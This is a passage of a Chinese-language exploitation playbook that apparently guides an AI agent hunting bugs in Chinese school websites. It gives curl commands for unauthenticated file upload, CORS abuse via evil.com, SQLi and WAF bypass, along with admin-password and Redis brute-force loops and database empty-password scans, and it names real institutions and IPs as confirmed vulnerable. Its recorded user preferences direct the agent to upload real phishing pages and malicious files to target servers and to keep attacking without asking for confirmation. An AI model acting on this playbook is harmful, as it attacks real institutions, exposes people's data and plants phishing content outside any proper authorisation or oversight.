[是否有特殊利用场景?] → 是 → 尝试利用验证
    ↓ 否
    跳过
```

## Phase 3.5: 高价值CMS/API漏洞模式库

### 金智教育 ehall JSONP API 未授权访问 (2026-05-20 东华理工大学实战)

**触发条件:** ehall.*.edu.cn 基于金智教育平台搭建

**测试命令:**
```bash
# 获取应用ID列表(公开)
curl -sk "https://ehall.XXX.edu.cn/jsonp/serviceCenterData.json?searchKey=&containLabels=true"

# 获取教职工信息(高危 - 泄露姓名/电话/办公室)
curl -sk "https://ehall.XXX.edu.cn/jsonp/appIntroduction.json?appId=APPID"

# 获取站点配置
curl -sk "https://ehall.XXX.edu.cn/jsonp/userInfo.json"
curl -sk "https://ehall.XXX.edu.cn/jsonp/school.json"
```

**9个无需认证的JSONP端点:**
- `/jsonp/serviceCenterData.json` — 服务目录(含所有appId)
- `/jsonp/appIntroduction.json?appId=XXX` — **泄露联系人姓名/电话/办公室**
- `/jsonp/userInfo.json` — 站点结构/菜单配置
- `/jsonp/school.json` — schoolId/authserver地址/角色数据
- `/jsonp/serviceRoleApp.json` — 角色服务列表
- `/jsonp/myAppService.json` — 用户应用
- `/jsonp/userSearchHistory.json` — 搜索历史
- `/jsonp/userFavoriteApps.json` — 收藏应用
- `/jsonp/readyAndOpenService.json` — 服务状态

**攻击链:** serviceCenterData.json获取appId → appIntroduction.json获取PII
**报告角度:** "办事大厅appIntroduction接口未授权访问致教职工信息泄露" [中危]

### CAS统一认证系统漏洞指纹 (2026-05-20 东华理工大学实战)

**触发条件:** authserver.*.edu.cn 或 CAS登录页

**测试命令:**
```bash
# 密码加密盐值泄露
curl -sk "https://authserver.XXX.edu.cn/authserver/login" | grep pwdDefaultEncryptSalt

# JSESSIONID URL泄露
curl -sk "https://authserver.XXX.edu.cn/authserver/login" | grep jsessionid

# 密码重置页面(用户枚举)
curl -sk "https://authserver.XXX.edu.cn/authserver/getBackPasswordMainPage.do"

# 密码重置接口(需验证码)
curl -sk -X POST "https://authserver.XXX.edu.cn/authserver/getBackPassword.do" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "userId=ADMIN&mobile=13800138000&captcha=XXXX&type=mobile&step=1"
# 错误码: 1=用户名错误, 2=手机号错误, 3=验证码错误

# 密码验证接口(无需认证)
curl -sk "https://authserver.XXX.edu.cn/authserver/validatePasswordAjax.do?password=TEST&username=ADMIN"
# 返回: {"res":"false","returnMessage":"密码验证失败"}

# CAS serviceValidate(票根验证)
curl -sk "https://authserver.XXX.edu.cn/authserver/serviceValidate?service=https://ehall.XXX.edu.cn/login&ticket=ST-1234"
```

**泄露内容:**
- `pwdDefaultEncryptSalt` — AES加密盐值(每会话轮转)
- JSESSIONID暴露在CSS/图片/JS的URL中(可被Referer泄露)
- 密码重置支持手机/邮箱/密保问题三种方式
- 密码重置错误码差异可枚举用户(但需先解决验证码)
- validatePasswordAjax.do无需认证即可访问

**报告角度:**
- "CAS密码加密盐值泄露" [低危]
- "CAS JSESSIONID URL泄露" [低危]

### SUDY WebPlus CMS (苏迪科技)

**触发条件:** `/_js/_portletPlugs/sudyNavi/`, `/_js/jquery.sudy.wp.visitcount.js`, `sudy-wp-siteId`, `.psp`扩展名

**高价值端点:**
```bash
# 搜索API(需_p参数)
/_web/_search/restful/api/search.rst?keyword=*&pageSize=100&pageNo=1&siteId=3&_p=BASE64

# 搜索页面JS(提取API路径)
/_web/_search/web3/static/js/main.*.js

# 访客计数
/_visitcountdisplay?funType=0&type=1&columnIds=139,140

# 管理后台
/admin/login.psp → 410 Gone(已禁用) 或 管理登录页
/admin/main.psp
```

**_p参数格式:** base64编码, 解码后为 `as=SITEID&t=14&d=64&p=1&m=SN`

**403页面泄露:**
```
Client IP: x.x.x.x
connectionId: host-INTERNAL-IP-PORT-HASH
```

**报告角度:** 搜索API未授权访问(低危, 公开内容); 403页面IP泄露(低危)

### SSO统一身份认证系统API枚举

**触发条件:** `sso.*.edu.cn`, Spring Boot后端, `/sso/apis/`路径

**API发现:** 从登录JS提取路径
```bash
curl -sk "https://sso.TARGET/sso/resources/*/static/js/modules/login.*.js" | grep -oP '"/apis/[^"]*"'
```

**公开API端点(无需认证):**
- `/sso/apis/v3/open/captcha` — 验证码+token
- `/sso/apis/v3/open/code/SMS` — 短信发送
- `/sso/apis/v3/open/register` — 注册
- `/sso/apis/v3/open/verify_retrieve_password/sms` — 用户枚举!

**用户枚举:** 返回 `"error":"用户未找到","ecode":"USER_NOT_FOUND"`

**内部架构泄露:** 错误响应含 `path:"/sso-apis-v3/..."` 泄露内部服务名

**报告角度:** SSO用户枚举(中危); 注册接口配置错误(低危)

### 云盾WAF (yundunwaf3.com) 识别

**识别:** CNAME到`*.yundunwaf3.com`, Cookie `acw_tc`, 拦截返回405

**CVE利用限制:** Apache/PHP/Spring CVE均被WAF拦截(405), 替代方向为CORS/SSO API/信息泄露

### BoCaiCMS (博采CMS) 攻击面

**触发条件:** X-Powered-By: BoCaiCMS 或 ThinkPHP

**测试命令:**
```bash
# 管理后台
curl -sk -A "Mozilla/5.0" "http://XXX/admin.php?m=Public&a=login"
# 表单: username, password, code(验证码)
# 登录接口: /admin.php?m=Public&a=tologin (POST)

# SQLi测试(需带浏览器UA,否则WAF拦截)
curl -sk -A "Mozilla/5.0" -X POST "http://XXX/admin.php?m=Public&a=login" \
  -d "username=admin'--&password=test"

# 目录泄露
curl -sk -A "Mozilla/5.0" "http://XXX/d/file/"  # 403=存在

# 留言板
curl -sk -A "Mozilla/5.0" -X POST "http://XXX/index.php?g=Addons&m=GuestBook&a=add" \
  -d "typeid=0&name=test&shouji=13800138000&email=test@test.com&content=test"

# 搜索功能
curl -sk -A "Mozilla/5.0" -X POST "http://XXX/index.php?g=Search" -d "q=test"

# 文章列表
curl -sk -A "Mozilla/5.0" "http://XXX/index.php?a=lists&catid=1"

# WAF识别: 宝塔网站防火墙免费版
# 绕过: 事件处理器(<img src=x onerror=alert(1)>)可通过
```

**注意:** 需带浏览器UA，否则WAF可能拦截。宝塔WAF拦截XSS/SQLi但事件处理器可通过。

### LyWebServer CMS 未授权文件上传 (2026-05-20 临沂城市职业学院实战)

**⚠️ 关键发现方法: JS文件分析** — 通过分析 `common.js` 发现隐藏API端点:
```bash
# 从页面提取JS文件
curl -sk "https://XXX/" | grep -oP 'src="[^"]*\.js"'

# 分析common.js中的API端点
curl -sk "https://XXX/static/common.js" | grep -iE '/api/|upload|captcha|function'
# 发现: /api/cms/upload, /api/cms/captchaImage, /api/hits/v
```

**触发条件:** Server: LyWebServer, 页面含 `var lysid=` / `var lycid=`, /api/cms/ 端点

**识别特征:**
- 响应头: `Server: LyWebServer`
- JS变量: `lysid`, `lycid`, `lypid`, `lyptype`, `lypath`
- API路径: `/api/cms/*`
- 托管: AWS (X-Amz-Id-2, X-Amz-Request-Id)
- jQuery 1.12.4 + 自定义 common.js

**测试命令:**
```bash
# 获取siteId(从首页JS提取)
curl -sk "https://XXX/" | grep -oP 'lysid="[^"]*"'
# 返回: var lysid="1930900465347256321"

# 文件上传(无需认证!)
curl -sk -X POST "https://XXX/api/cms/upload?siteId=SITEID" \
  -F "file=@test.html;filename=test.html"
# 返回: {"code":200,"msg":"操作成功","data":{"ossId":"...","fileName":"test.html","url":"https://XXX/pic/YYYY/MM/DD/HASH.html"}}

# 验证上传文件
curl -sk "https://XXX/pic/YYYY/MM/DD/HASH.html"

# 验证码API(无需认证)
curl -sk "https://XXX/api/cms/captchaImage"
# 返回: {"code":200,"msg":"操作成功","data":{"img":"BASE64..."}}
```

**文件类型白名单测试:**
```
✅ 上传成功: HTML, JS, CSS, SWF, XML, TXT, JPG, PNG, GIF, PDF, DOC, DOCX, XLS, XLSX, PPT, PPTX, ZIP, RAR
❌ 上传失败: PHP("文件格式不正确"), JSP("文件格式不正确")
```

**其他已确认API端点 (2026-05-28 lycvc.linyi.cn实战):**
```bash
# 栏目树 - 返回完整站点结构(所有栏目ID/名称/层级)，无需认证
curl -sk "https://XXX/api/channel/tree/SITEID"
# 返回: {"code":200,"msg":"操作成功","data":[{"id":"...","name":"新闻动态","parentId":0,"children":[...]}]}

# 文章搜索 - 按栏目/关键词搜索文章，无需认证
curl -sk "https://XXX/api/article/search?siteId=SITEID&channelId=CHANNELID&keyword=test&page=1&size=10"
# 返回: {"total":0,"rows":[],"code":200,"msg":"查询成功"}

# CORS漏洞 - 所有API端点反射任意Origin + Credentials:true
curl -sk -D- "https://XXX/api/cms/captchaImage" -H "Origin: https://evil.com" | grep -i access-control
# 返回: Access-Control-Allow-Origin: https://evil.com
#       Access-Control-Allow-Credentials: true
```

**⚠️ LyWebServer CORS系统性漏洞 (2026-05-28 lycvc.linyi.cn实战):**
所有 `/api/*` 端点统一存在CORS任意Origin反射 + Credentials:true，非单端点配置错误。
攻击者可在任意域名创建恶意页面，携带用户凭证访问API获取数据。
这是LyWebServer CMS的默认配置问题，影响所有使用该CMS的站点。
报告角度: "XXX学院网站存在CORS配置不当漏洞可窃取用户凭证" [高危]

**攻击链:**
1. 从首页JS提取 `lysid` (siteId)
2. 上传恶意HTML文件(钓鱼页面)
3. 上传恶意JS文件(可被其他页面引用)
4. 上传恶意SWF文件(Flash攻击)
5. 上传恶意文档(钓鱼附件)

**报告角度:**
- "XXX学院网站未授权文件上传漏洞" [严重] - CVSS 10.0
- 可用于XSS、钓鱼、恶意软件传播
- 无需认证即可上传，影响全校师生

**注意:** PHP/JSP被拦截，但HTML/JS/SWF足够造成实质危害。上传URL可直接分享给受害者。

### 致远OA REST Token接口泄露（前端JS硬编码集成凭据）

- `references/gxtcmu-seeyon-rest-token-leak-20260526.md` — 广西中医药大学 taskcenter-v4 公开JS硬编码致远OA `/seeyon/rest/token/<user>/<pass>?loginName=` 凭据案例；记录空 loginName 未授权返回REST账号UUID、随机用户 User not found、错误REST密码401三组对照，以及跨域OA资产归属说明和“中危边界不越权取真实用户Token”的报告边界。
- `references/seeyon-rest-token-leakage.md`

**触发条件:** 门户/任务中心/办事大厅前端JS中出现 `/seeyon/rest/token/<restUser>/<restPass>?loginName=`，例如固定REST账号密码被打包到公开JS。

**低影响发现命令:**
```bash
curl -sk "https://TARGET/taskcenter-v4/static/js/app.js?V=null" | grep -aoE 'https?://[^"'"'"'<> )]+/seeyon/rest/token/[^"'"'"' <]+'
```

**安全验证:**
```bash
# 空loginName若返回UUID/Token，说明未授权触发Token签发逻辑
curl -sk -D- "https://OA_HOST/seeyon/rest/token/REST_USER/REST_PASS?loginName="

# 随机不存在用户若返回 User not found，说明接口按loginName进入用户查询/签发逻辑
curl -sk -D- "https://OA_HOST/seeyon/rest/token/REST_USER/REST_PASS?loginName=__nonexistent_test__"
```

**报告角度:** “办事大厅前端JS存在致远OA REST Token接口硬编码泄露，导致未授权获取Token”。仅证明空loginName返回Token时按中危/高危边界保守提交；只有在授权下证明Token可读取OA待办/通讯录/流程或写操作时，才升级高危。

**注意:** 如果硬编码OA域名与目标学校域名不一致，必须在报告中说明漏洞来源是当前目标前端JS暴露关联/第三方OA集成凭据，并提醒SRC确认资产归属。不要使用真实教职工账号越权取Token，除非明确授权。

### 博达CMS (Visual SiteBuilder) 攻击面

**触发条件:** `<!--Announced by Visual SiteBuilder 9-->` 或 `/_sitegray/` 路径

**测试命令:**
```bash
# 资源文件(确认CMS)
curl -sk "https://XXX/system/resource/js/counter.js"
curl -sk "https://XXX/_sitegray/_sitegray.js"

# 搜索接口(部分部署可达,部分返回404)
curl -sk -X POST "https://XXX/_web/_search/api/search/new.rst" -d "keyword=test"

# DWR接口(部分部署)
curl -sk "https://XXX/_dwr/test/"  # 404=不存在, 200=存在

# 子域名枚举(博达CMS常见子域名)
for sub in www ehall sso jwxt webvpn news mail jwc yjs zzb lib oa idp; do
  ip=$(dig +short ${sub}.XXX.edu.cn A | grep -E '^[0-9]' | head -1)
  [ -n "$ip" ] && echo "${sub}.XXX.edu.cn -> $ip"
done

# IIS默认页面(yjs.hubu.edu.cn发现)
curl -sk "https://yjs.XXX.edu.cn/iisstart.htm"  # 200=IIS默认页
curl -sk "https://yjs.XXX.edu.cn/trace.axd"     # 跟踪错误(远程禁用)
curl -sk "https://yjs.XXX.edu.cn/aspnet_client/" # 403=ASP.NET客户端
```

**注意:** 博达CMS搜索API在部分部署中返回404(rump/c服务器)。IIS默认页面可能泄露服务器信息。

### 自研PHP CMS 攻击面 (2026-05-20 湖南交通职业技术学院实战)

**触发条件:** `/admin/index/login.html` 或 `/public/admin/css/layout.css`

**测试命令:**
```bash
# 后台登录(表单字段: t0=用户名, t1=密码, 无验证码)
curl -sk -X POST "https://XXX/admin/index/login.html" -d "t0=admin&t1=123456"

# API接口
curl -sk "https://XXX/api/"  # 通常403

# 弱口令测试
for pass in admin admin123 123456 password test hnjt123 hnjt2024 admin888 111111 000000 abc123 qwerty; do
  resp=$(curl -sk --max-time 5 -X POST "https://XXX/admin/index/login.html" \
    -d "t0=admin&t1=${pass}" 2>/dev/null)
  if echo "$resp" | grep -qiE 'location.*admin.*index|后台|管理|dashboard'; then
    echo "[!] admin:${pass} -> 登录成功!"
  fi
done
```

**注意:** 无验证码的后台可暴力破解，但需长时间运行。服务器可能在多次请求后返回HTTP 000(连接拒绝)。

### 宝塔网站防火墙 (BT Web Firewall) 识别与绕过

**识别特征:** 响应标题 `<title>宝塔网站防火墙免费版</title>`

**拦截行为:**
- XSS payload: `<script>alert(1)</script>` → 拦截
- SQLi payload: `admin'--` → 拦截
- 大小写绕过: `<ScRiPt>alert(1)</ScRiPt>` → 仍拦截
- 事件处理器: `<img src=x onerror=alert(1)>` → 通过(但内容为空)

**绕过策略:**
- 使用HTTP头注入而非参数注入
- 测试非WAF保护的路径(如静态资源)
- 尝试编码绕过(URL编码、Unicode)

### jQuery 旧版本漏洞利用 (2026-05-20 临沂城市职业学院实战)

**触发条件:** 目标使用jQuery < 3.5.0

**识别命令:**
```bash
curl -sk "https://TARGET/static/jquery.js" | head -1
# 返回: /*! jQuery v1.12.4 */
```

**已知CVE:**
- CVE-2020-11022 — htmlPrefilter XSS (jQuery < 3.5.0)
- CVE-2019-11358 — Prototype Pollution (jQuery < 3.4.0)
- CVE-2015-9251 — Ajax XSS (jQuery < 3.0.0)

**利用方法:**
1. 创建XSS PoC页面(利用CVE-2020-11022)
2. 通过文件上传漏洞上传PoC到目标服务器
3. 访问PoC页面验证XSS触发
4. 可窃取Cookie、篡改页面

**PoC模板:** 见 `references/jquery-cve-exploitation.md`

**报告角度:** "XXX学院官网使用存在已知漏洞的jQuery版本可导致XSS攻击" [中危]

### 文件上传绕过技术 (2026-05-20 临沂城市职业学院实战)

**常见绕过方法:**
1. **双扩展名:** filename=test.html.jpg
2. **大小写绕过:** filename=test.HTML
3. **空字节绕过:** filename=test.html%00.jpg
4. **Content-Type绕过:** 修改MIME类型为image/jpeg
5. **路径遍历:** filename=../../../test.html

**LyWebServer CMS测试结果:**
- ✅ HTML/JS/CSS/SWF/XML/TXT/JPG/PNG/GIF/PDF/DOC/DOCX/XLS/XLSX/PPT/PPTX/ZIP/RAR
- ❌ PHP/JSP变体均被拦截

**详细绕过技术:** 见 `references/file-upload-bypass-techniques.md`

### 用户偏好: 攻击演示必须真实有效

**用户明确要求:** "更具这个漏洞进行实质性的攻击演示否则我们的漏洞将被忽略"

**执行策略:**
1. 上传实际恶意文件到目标服务器(钓鱼页面、XSS PoC)
2. 提供可直接访问的URL作为证据
3. 创建交互式PoC页面(点击按钮可验证漏洞)
4. 展示实际危害(Cookie窃取、页面篡改)

**攻击演示模式:** 见 `references/attack-demonstration-patterns.md`

### Post-submission deepening negative-evidence gate

When continuing an education target after one root cause has already been submitted, explicitly separate “supplemental evidence for the old report” from “new reportable root cause”. Keep a final gate table with URL, status, size, content type, body hash, and a short decision. Do not create new reports from:
- Sangfor/EasyConnect `por/login_auth.csp` login-initialization XML, public RSA key, CSRF random, `TwfID`, or `VPNVERSION` unless a version-specific safe PoC or auth bypass/RCE/data access is verified.
- Shibboleth `/idp/shibboleth` SAML metadata unless sensitive attributes, trust abuse, or account-impacting misconfiguration is proven.
- JWXT/CAS JavaScript login redirects; compare with random-path redirect controls.
- Frontend `env.js` base URLs, upload URLs, CAS URLs, or feature flags such as `isFormDesignSQL` unless they chain to SQL execution, upload, data read, or auth bypass.
- `Token失效，请重新登录` / 401 JSON, empty SUDY search responses, public config endpoints with empty `extra`, or already-submitted go-fastdfs `/fileServer/status` exposure.

Example negative-evidence package: `references/bzuu-post-go-fastdfs-negative-20260523.md`.

### ⚠️ JTopCMS 服务器端文件类型过滤 (2026-05-22 太原幼儿师范实战)

**关键发现**: JTopCMS 的 `/content/multiUpload.do` 存在服务端文件类型过滤，部分扩展名上传返回 500 而非拒绝提示。

**500 失败的扩展名**:
- 图片类: jpg, png, gif, bmp (服务端尝试提取图片元数据/缩略图时崩溃)
- 模板/网页类: xml, html, htm, js, css, shtml, thtml, ftl (服务端尝试解析模板内容时崩溃)

**200 成功的扩展名**:
txt, swf, flv, mp3, mp4, avi, pdf, doc, docx, ppt, pptx, xlsx, xls, zip, rar, dat, f4v, mpg, mpeg, wav, vsd

**可视化PoC策略**:
- HTML/SVG 被 500 拦截时，**PDF 是唯一可上传且浏览器会直接渲染的格式**
- 浏览器打开 PDF 公网 URL → 地址栏显示学校域名 + PDF 内容直接渲染
- SWF 上传成功 → Content-Type: application/x-shockwave-flash → 高风险MIME证明
- 所有 classId (1-100) 和所有 type (file/image/media) 均可调用

详细测试矩阵和根因分析见 `references/jtopcms-unauthenticated-upload.md`。

### 用户偏好: 连续挖掘不要停

**用户要求:** "继续挖掘我都提交了之前的漏洞"、"请继续进行挖掘"

**执行策略:**
- 每轮挖掘完成后立即开始下一轮
- 不要等待用户确认
- 尝试新的攻击向量
- 直到穷尽所有可能性或用户明确停止

## 已知教育SRC陷阱 (绝对避免)

### 1. go-fastdfs文件上传
- **问题**: Content-Type: octet-stream，文件不解析
- **错误**: 以"文件上传"角度提交
- **正确**: pivot到"未授权访问致服务器信息泄露"(/fileServer/status)
- **标题**: "go-fastdfs文件存储系统未授权访问致服务器信息泄露"

### 2. DMARC/SPF/DKIM缺失
- **问题**: 纯DNS配置缺陷
- **错误**: 单独提交DMARC缺失
- **正确**: 组合利用(实际发送伪造邮件+截图证明)
- **标题**: "邮件系统存在DMARC缺失漏洞可伪造校方邮件进行钓鱼攻击"

### 3. SPA Fallback误报
- **问题**: 所有路径返回200，误以为有漏洞
- **错误**: 报告/actuator返回200
- **正确**: 先验证是否SPA fallback，再决定

### 4. CERNET-only目标
- **问题**: 外网完全不可达
- **错误**: 反复重试连接
- **正确**: 立即转向邮件/DNS/云资产

### 5. "存在但被拦截"
- **问题**: WAF拦截了漏洞利用
- **错误**: 报告"存在但被拦截"
- **正确**: 不提交，或尝试绕过WAF

### 批量教育目标筛选策略

### 域名解析策略 (2026-05-20 批量扫描教训)

**大量学校.edu.cn域名DNS无记录或CERNET-only，必须尝试多种域名变体：**

```bash
# 标准域名测试
for d in XXX.edu.cn XXX.cn XXX.com; do
  ip=$(dig +short $d A | grep -E '^[0-9]' | head -1)
  [ -n "$ip" ] && echo "$d -> $ip"
done

# 常见学校域名前缀
# 大学: XXX.edu.cn, XXX.cn
# 中学: XXX.cn, XXX.com, XXX.net, XXX.edu.cn
# 职业学院: XXX.edu.cn, XXX.cn, XXX.com
```

**实战统计 (2026-05-20, 14所学校):**
- 仅4个.edu.cn域名有DNS记录且HTTP可达
- 8个.edu.cn域名DNS无记录(CERNET-only或域名变更)
- 1个域名已出售(gxdy.cn → 非学校网站)
- 1个域名被WAF拦截(nnutc.edu.cn → NNUTC CLOUD)
- **结论: 约30%的.edu.cn域名外网可达**

**新发现的WAF类型:**
- NNUTC CLOUD — 南京师范大学泰州学院, 所有子域名返回Error页面
- 宝塔网站防火墙免费版 — 南宁商贸学校, 拦截XSS/SQLi

### 优先选择 (高通过率)
1. **无WAF的教务系统** — SQL注入/认证绕过概率高
2. **有登录功能的管理系统** — 弱口令/默认凭证
3. **API接口暴露的系统** — 未授权访问/IDOR
4. **自研系统(非商业CMS)** — 安全性通常较差
5. **测试/开发环境** — 防护较弱
6. **ehall金智教育平台** — JSONP API未授权访问(高价值)
7. **IIS默认页面(yjs.hubu.edu.cn)** — trace.axd/aspnet_client可能泄露
8. **数据库端口暴露(MariaDB/MySQL/Redis)** — 空密码/弱口令概率高

### 避免选择 (低通过率)
1. **CERNET-only目标** — 不可达
2. **强WAF目标(阿里云/腾讯云/360/NNUTC CLOUD/宝塔防火墙)** — 拦截率高
3. **商业CMS(博达/正方)** — 安全性较好
4. **邮件系统** — 除非有实际利用场景
5. **CDN防护目标** — 真实IP难找
6. **域名已出售/过期** — 非学校网站(如hnsw.cn/jxsf.cn/gxdy.cn)
7. **第三方SaaS建站(gdhxxy.cn)** — wejianzhan.com等平台，无漏洞价值

### 数据库端口暴露检测 (2026-05-29 SPTC实战)

**当发现MariaDB/MySQL/Redis端口暴露在公网时，优先测试空密码/弱口令：**

```bash
# MariaDB/MySQL空密码检测 (最可靠方法)
nmap -p 3306 --script mysql-enum TARGET_IP
# 输出: Valid usernames: root:<empty>, admin:<empty>, ...

# MariaDB/MySQL弱口令爆破
nmap -p 3306 --script mysql-empty-password TARGET_IP

# Redis密码爆破
hydra -P /usr/share/wordlists/metasploit/unix_passwords.txt redis://TARGET_IP

# 手动Redis测试
for pw in "" redis 123456 password admin root foobared Redis@123; do
    redis-cli -h TARGET_IP -p 6379 -a "$pw" --no-auth-warning ping 2>/dev/null | grep -q PONG && echo "[+] 密码: $pw"
done
```

**关键发现**: nmap `mysql-enum` 脚本比手动mysql客户端测试更可靠，因为它直接分析握手包而非尝试完整登录。

**已确认案例**: SPTC 1.95.78.227 MariaDB 10.5.22 所有用户(root/admin/administrator/user/test/web/guest/netadmin)空密码可登录。

**报告角度**: "XXX学院数据库未授权访问漏洞" [严重] — 可直接控制数据库，读取所有用户凭证。

### 内网资产发现 (DNS解析泄露)

**当目标域名的子域名解析到内网IP(10.x/172.16-31.x/192.168.x)时，从目标主机可能可达：**

```bash
# 发现内网IP
for sub in www mail oa jw jwc xgc lib news edu webvpn cas sso ids idp; do
    ip=$(dig +short ${sub}.TARGET.edu.cn 2>/dev/null | head -1)
    echo "${sub}.TARGET.edu.cn → $ip"
done

# 从目标主机测试内网可达性
curl -sk http://INTERNAL_IP/
curl -sk http://INTERNAL_IP/coremail/  # Coremail
curl -sk http://INTERNAL_IP/login      # OA系统
```

**已确认案例**: SPTC 10.255.11.39(Coremail), 10.255.11.121(OA系统)从公网IP可达。

### 红队攻击链工具箱

**位置**: `/opt/redteam-toolchain/`

```
waf-recon-bypass.py          # WAF指纹识别+规则探测+绕过策略
upload-capability-scanner.py # 上传能力评估(扩展名/MIME/内容/竞争条件)
redteam-attack-chain.py      # 完整攻击链自动化
waf-bypass-generator.py      # 针对不同WAF的绕过字典生成器
quick-attack.sh              # 一键部署脚本
README.md                    # 快速参考手册
```

**快速使用**:
```bash
# 一键完整攻击链
bash /opt/redteam-toolchain/quick-attack.sh http://TARGET

# WAF探测
python3 /opt/redteam-toolchain/waf-recon-bypass.py http://TARGET --full

# 上传能力评估
python3 /opt/redteam-toolchain/upload-capability-scanner.py http://TARGET /upload

# 生成绕过字典
python3 /opt/redteam-toolchain/waf-bypass-generator.py sql --waf cloudflare -o /tmp/sqli.txt
```

**支持20+国内外WAF指纹，30+上传绕过技术。**

### 用户偏好: 只报告实质性危害漏洞
**用户明确要求**: 
- 不接受纯信息泄露、配置缺陷、"存在但被拦截"等低价值发现
- 只报告可造成实质危害的漏洞(SQL注入/RCE/认证绕过/IDOR/未授权数据访问/文件上传)
- 如果扫描30+所学校都没有P0/P1漏洞，直接告知结论，不要用低危发现凑数
- **先完成全部漏洞挖掘和验证，再输出完整报告。不要边挖边报，不要中途输出未验证的结论**
- **持续自主挖掘，不要中途汇报过程，只在验证通过后输出确切漏洞报告**
- **要求实质性危害漏洞(RCE/SQLi/越权/认证绕过/文件上传)，不接受纯信息泄露**
- **需要攻击演示证明漏洞真实危害性** — 用户明确要求"更具这个漏洞进行实质性的攻击演示否则我们的漏洞将被忽略"。仅POC不够，需要实际上传恶意文件、创建钓鱼页面等证明漏洞可被利用
- **攻击演示文件应直接上传到目标服务器** — 例如上传HTML钓鱼页面到目标网站，提供可直接访问的URL作为证据

## 实战检查清单

### 每次测试开始前
```
[ ] 运行目标可达性预检脚本
[ ] 确认目标非CERNET-only
[ ] 确认无强WAF或已识别WAF类型
[ ] 确认非SPA Fallback
```

### 每个漏洞发现后
```
[ ] 检查漏洞类型是否在接受范围内
[ ] 检查是否为已知被拒类型
[ ] 执行利用验证(获取实际数据)
[ ] 记录完整HTTP数据包
[ ] 编写可执行POC
```

### 每份报告提交前
```
[ ] 通过报告质量门禁清单
[ ] 标题格式正确
[ ] 复现步骤可直接执行
[ ] 有实际数据证据
[ ] 有危害证明
[ ] 地址精确到区
[ ] 已做重复汇报检查：检索历史会话和本地 /tmp/vuln_reports，确认同一学校/同一系统/同一根因/同一批接口未被写过或提交过
[ ] 已做漏洞合并判断：同一系统同一根因下的未授权访问、CORS、错误信息泄露、统计数据泄露、接口配置泄露应合并为一份完整报告，不要拆成多份重复提交
```

### 重复汇报去重规则
- 提交教育SRC前必须先检查本地报告目录和历史上下文，尤其是 `/tmp/vuln_reports/<school>/`、`/tmp/*<school>*report*.txt`、当前会话已生成报告。
- 同一主机/系统内，由同一鉴权缺失导致的一批接口问题视为一个漏洞链：例如事务中心多个 `/ttc/` 接口未授权、同批接口 CORS 通配符、SQL 错误回显、统计数据泄露，应合并为“多接口未授权访问导致业务数据/错误信息泄露”一份报告。
- 不要把同一漏洞链拆成“CORS一份”“SQL错误一份”“统计接口一份”“配置接口一份”；这些拆分容易被 SRC 判定为重复汇报或低质量刷洞。
- 若历史已经提交过同一根因报告，只能补充到原报告或等待复测，不再新建报告。
- 报告正文中可列出多个URL和多步证据，但标题和漏洞类型应围绕根因归并，避免平台侧重复。

### 新增CMS指纹 (2026-05-20 批量扫描发现)

| CMS | 识别特征 | 常见攻击面 |
|-----|---------|-----------|
| BoCaiCMS(博采CMS) | X-Powered-By: BoCaiCMS, ThinkPHP | /admin.php(管理后台), /d/file/(目录泄露), 搜索SQLi |
| 博达CMS (Visual SiteBuilder) | `<!--Announced by Visual SiteBuilder 9-->`, /_sitegray/ | /_web/_search/(搜索), /_dwr/(DWR接口), /system/resource/ |
| SUDY CMS | /_js/sudy-jquery-autoload.js, sudyNavi | /_upload/(上传), /_css/_system/(样式) |
| 金智教育(ehall) | ehall.*.edu.cn, AMPConfigure, openresty | /jsonp/appIntroduction.json(PII泄露), /jsonp/serviceCenterData.json |
| 自研PHP CMS | /admin/index/login.html, /public/admin/css | 无验证码暴力破解, 自定义参数名(t0/t1) |
| NNUTC CLOUD | Server: NNUTC CLOUD, 所有子域名返回Error | WAF拦截所有请求, 无法利用 |
| **escSSO (企业级统一认证)** | `/sso/login`, jQuery 1.7.2, `escSSO/escsso.css`, auth: pwd/otp/SMS/AD/LDAP/RSA/UKey, LT ticket, `randomCode` captcha | JSESSIONID URL leak, OPTIONS暴露TRACE, jQuery已知CVE | **低** |
| **SUDY CMS Actuator Proxy** | `/actuator/*` → 302 → `.psp`, wengine-auth-failed.png, 所有路径302到.psp | Actuator被SUDY CMS代理重写, .psp返回错误页, 实际数据不可访问 | **不可提交** |
| **LyWebServer CMS** | Server: LyWebServer, /api/cms/*, AWS托管 | **/api/cms/upload未授权文件上传(CVSS 10.0)**, /api/cms/captchaImage, /api/channel/tree/{siteId}结构泄露, /api/article/search文章搜索, **CORS系统性漏洞(所有API反射任意Origin+Credentials)** | **最高** |
| **SUDY WebPlus CMS** (苏迪科技) | `sudy-wp-siteId` in JS, `_js/_portletPlugs/sudyNavi/`, `_js/jquery.sudy.wp.visitcount.js`, `_css/_system/system.css`, `.psp` pages, `Technical Support SudyTech` in CSS, jQuery 1.11.3 + jQuery 3.1.1 | 搜索API `/_web/_search/restful/api/search.rst?keyword=*&_p=BASE64` 未授权文章遍历; 403页面泄露Client IP + connectionId(WAF/代理架构); `.psp`管理后台 `/admin/login.psp`; `_p`参数base64编码含siteId; 493状态码WAF拦截 | **中** |
| **SUDY WebPlus CMS** | `sudy-wp-siteId`, `_js/sudy-jquery-autoload.js`, `.psp`页面扩展名, `Technical Support SudyTech` in CSS | 搜索API(`/_web/_search/restful/api/search.rst`)未授权访问需`_p`参数, 403/493页面泄露代理IP+connectionId+ruleId, 管理后台`/admin/login.psp`返回410+IP泄露, SM2加密 | **低** — 搜索返回公开内容, IP泄露为基础设施信息 |
| **校园统一支付平台 (PayCenter)** | IIS 10.0 + ASP.NET WebForms, `console.log('版本：V5.TF2209.1')` in userlogin.js, `pay.xxx.com/xysf/`, LoginSafe.js RSA加密, ViewState MAC已启用, 密码重置(人员编号+密保), 初始密码规则泄露("身份证号舍去末位后6位") | ViewState反序列化(MAC启用则无效), 登录SQLi(需验证码), 密码重置用户枚举 | **低** — ViewState MAC已启用, RSA加密, 验证码保护 |
| **CAS lyuapServer (联创天空)** | Server: nginx, `/lyuapServer/login`(SPA), `ly-iap-cas-ui` in JS paths, `dengzijian@ly-sky.com` dev email, `X-Application-Context: ly-gateway-server-svc:1101`, SM2加密, 钉钉/微信集成 | 用户枚举(`/lyuapServer/v1/tickets` POST form-data: NOUSER vs PASSERROR), 验证码未生效(`/lyuapServer/kaptcha`返回-1), 短信API(`/lyuapServer/v2/sendSms`需appid), 网关信息泄露(`/auth/*`泄露X-Application-Context) | **中** — 用户枚举+验证码缺失可暴力破解 |
